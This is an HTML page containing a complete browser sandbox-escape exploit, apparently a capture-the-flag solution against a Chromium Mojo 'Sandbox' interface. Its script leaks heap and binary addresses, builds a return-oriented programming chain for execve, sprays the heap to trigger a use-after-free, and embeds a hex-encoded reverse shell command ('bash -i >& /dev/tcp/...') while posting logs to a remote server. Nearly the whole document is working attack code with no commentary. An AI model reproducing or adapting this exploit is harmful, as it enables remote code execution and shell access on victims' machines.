<html>

<head>
  <title>Sandbox cant stop me</title>
  <script src="http://0.0.0.0:8080/mojo_bindings/mojo_bindings.js"></script>
  <script src="http://0.0.0.0:8080/mojo_bindings/third_party/blink/public/mojom/sandbox/sandbox.mojom.js"></script>
  <script>
    let logBuf = '';
    function log(msg) {
      console.log(msg);
      logBuf += `${msg}\n`;
    }
    async function sendLogs() {
      await fetch("http://0.0.0.0:8080/logs.php", {
        method: "POST",
        body: logBuf,
      });
      logBuf = '';
    }
    const hex = i => `0x${i.toString(16)}`;


    function newSbxInstance() {
      const iface = new blink.mojom.SandboxPtr();
      Mojo.bindInterface(blink.mojom.Sandbox.name, mojo.makeRequest(iface).handle);

      return iface;
    }

    const SPRAY1_QTY = 250;
    const SPRAY2_QTY = 50;
    async function pwn() {
      log("Starting");

      const fake = newSbxInstance();
      const heapLeak = (await fake.getHeapAddress()).addr;
      const textLeak = (await fake.getTextAddress()).addr;
      const chromeBase = BigInt(textLeak) - 0x627fc20n;
      const fakeVtableAddr = BigInt(heapLeak) + 0x10n;

      // gadgets
      const syscall = chromeBase + 0x972e4b7n; // syscall
      const add_rsp_ret = chromeBase + 0x8ff9a59n; // add rsp, 0x28 ; ret
      const pop_rdi = chromeBase + 0x38da5adn; // pop rdi ; ret
      const pop_rsi = chromeBase + 0x3a0af9en; // pop rsi ; ret
      const pop_rdx = chromeBase + 0x39fbe92n; // pop rdx ; ret
      const pop_rax = chromeBase + 0x3897616n; // pop rax ; ret
      // mov rsp, [rdi] ; mov rbp, [rdi+0x8]; mov [rdi+0x20], 0x0; jmp [rdi+0x10]
      const switchFakeBufToStack = chromeBase + 0x590cc13n;
      const lastJmpAddr = add_rsp_ret;

      const bin_sh_addr = fakeVtableAddr + 0x71n;
      const argv_addr = fakeVtableAddr + 0xb1n;

      const ropChain = new BigUint64Array(0x800 / 8);
      ropChain[4] = switchFakeBufToStack; // jmp [rdi+0x10] -> lastJmpAddr
      // execve("/bin/sh", ["/bin/sh", "-c", cmd], 0);
      ropChain[5] = pop_rdi;
      ropChain[6] = bin_sh_addr;
      ropChain[7] = pop_rsi;
      ropChain[8] = argv_addr;
      ropChain[9] = pop_rdx;
      ropChain[10] = 0n;
      ropChain[11] = pop_rax;
      ropChain[12] = 59n;
      ropChain[13] = syscall;

      // "/bin/sh\0-c\0/bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/9001 0>&1'"
      ropChain[14] = 0x0068732f6e69622fn;
      ropChain[15] = 0x2f6e69622f00632dn;
      ropChain[16] = 0x20632d2068736162n;
      ropChain[17] = 0x692d206873616227n;
      ropChain[18] = 0x7665642f20263e20n;
      ropChain[19] = 0x302e302f7063742fn;
      ropChain[20] = 0x3030392f302e302en;
      ropChain[21] = 0x002731263e302031n;

      // argv address
      ropChain[22] = fakeVtableAddr + 0x71n; // /bin/sh
      ropChain[23] = fakeVtableAddr + 0x71n + 8n; // -c
      ropChain[24] = fakeVtableAddr + 0x71n + 11n; // ...cmd

      fake.pourSand(new Uint8Array(ropChain.buffer));

      log(`heap leak: ${hex(heapLeak)}`);
      log(`text leak: ${hex(textLeak)}`);
      log(`chrome binary base: ${hex(chromeBase)}`);
      log(`fake vtable addr: ${hex(fakeVtableAddr)}`);
      await sendLogs();

      const spray1 = new Array(SPRAY1_QTY);
      for (let i = 0; i < spray1.length; i++) {
        spray1[i] = newSbxInstance();
      }
      const spray2 = new Array(SPRAY2_QTY);
      for (let i = 0; i < spray2.length; i++) {
        spray2[i] = newSbxInstance();
      }

      let iface = newSbxInstance();
      // 0x800 + sizeof(class SandboxImpl)
      const sand = new BigUint64Array((0x800 + 0x820) / 8);
      // sand.fill(0x4141414141414141n);
      sand[0x800 / 8] = fakeVtableAddr + 1n;
      sand[0x800 / 8 + 2] = lastJmpAddr;
      sand[0x800 / 8 + 0x818 / 8] = 0n;

      // search for "backup_" prop offset
      // for (let i = 0; i < 0x1020/8; i++) { 
      //   sand[i] = BigInt('0x'.padEnd(8*2+2, i)); // -> (0x203) * 8 => (1018) - 0x800 = 0x818
      // }

      const sandToPour = new Uint8Array(sand.buffer);

      for (let i = 0; i < spray1.length; i++) {
        spray1[i].pourSand(sandToPour);
      }

      for (let i = 0; i < 100; i++) {
        iface.pourSand(sandToPour);
        iface.ptr.reset();
        iface = newSbxInstance();
      }

      for (let i = 0; i < spray2.length; i++) {
        spray2[i].pourSand(sandToPour);
      }

      log("Finished");

      await sendLogs();
    }

    pwn();
  </script>
</head>

<body>
</body>

</html>